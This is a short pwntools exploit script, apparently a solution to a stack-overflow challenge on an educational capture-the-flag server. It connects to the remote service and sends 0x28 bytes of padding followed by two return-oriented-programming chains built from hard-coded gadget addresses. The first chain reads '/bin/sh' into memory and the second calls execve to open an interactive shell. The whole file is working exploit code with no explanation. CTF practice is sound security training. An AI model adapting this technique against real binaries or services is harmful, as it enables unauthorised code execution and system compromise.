from pwn import *

#r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10003)
raw_input()
context.arch = 'amd64'

pop_rax_ret = 0x447b27
pop_rdi_ret = 0x401e3f
pop_rsi_ret = 0x409e6e
pop_rdx_rbx_ret = 0x47ed0b
syscall_ret = 0x414506
leave_ret = 0x401797

binsh = 0x68732f6e69622f #'/bin/sh\x00'

ROP_read = flat(
    # call read function
    pop_rax_ret, 0,
    pop_rdi_ret, 0,
    pop_rsi_ret, 0x4c72a0,
    pop_rdx_rbx_ret, 0x100, 0,
    syscall_ret,    
)

ROP_shell = flat(
    # Get shell
    pop_rax_ret, 0x3b,
    pop_rdi_ret, 0x4c72a0,
    pop_rsi_ret, 0,
    pop_rdx_rbx_ret, 0, 0,
    syscall_ret,
    
)

r.sendafter("show me rop\n>", b'a'*0x28 + ROP_read + ROP_shell)
r.send(flat(binsh))

r.interactive()